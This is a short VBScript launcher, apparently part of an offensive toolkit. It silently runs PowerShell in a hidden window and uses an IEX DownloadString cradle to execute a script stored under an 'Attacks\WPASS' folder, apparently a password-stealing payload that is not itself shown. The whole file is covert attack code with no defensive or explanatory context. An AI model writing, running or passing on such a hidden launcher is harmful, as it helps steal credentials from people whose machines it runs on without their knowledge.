Set FSO = CreateObject("Scripting.FileSystemObject")
set script=CreateObject("wscript.shell")
strPath = FSO.GetParentFolderName (WScript.ScriptFullName)
script.run "powershell IEX (New-Object Net.WebClient).DownloadString('file://" & strPath & "\Attacks\WPASS\wpass.ps1')", 0